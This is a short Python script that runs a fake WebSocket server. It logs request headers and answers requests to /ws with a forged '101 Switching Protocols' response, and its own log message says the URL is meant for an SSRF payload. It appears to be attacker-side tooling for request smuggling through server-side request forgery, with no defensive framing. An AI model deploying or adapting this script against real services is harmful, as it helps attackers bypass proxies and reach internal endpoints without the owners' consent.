#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class FakeWebSocketHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        logger.info(f"Received request: {self.path}")
        logger.info(f"Headers: {self.headers}")
        
        # If requesting the WebSocket endpoint, respond with 101 Switching Protocols
        if self.path == '/ws':
            logger.info("🔥 WebSocket upgrade request detected! Responding with 101")
            self.protocol_version = "HTTP/1.1"
            self.send_response(101)
            self.send_header('Upgrade', 'websocket')
            self.send_header('Connection', 'Upgrade')
            self.send_header('Sec-WebSocket-Accept', 'ICX+Yqv66kxgM0FcWaLWlFLwTAI=')  # Fake accept key
            self.end_headers()
        else:
            # Default response
            logger.info(f"Standard request to {self.path}")
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Server running")

def run_server(host='0.0.0.0', port=8000):
    server_address = (host, port)
    httpd = HTTPServer(server_address, FakeWebSocketHandler)
    logger.info(f"✅ Server running on http://{host}:{port}")
    logger.info(f"🔧 Use this URL in your SSRF payload: http://{host}:{port}/ws")
    httpd.serve_forever()

if __name__ == '__main__':
    try:
        run_server()
    except KeyboardInterrupt:
        logger.info("Server stopped by user")
    except Exception as e:
        logger.error(f"Server error: {e}")
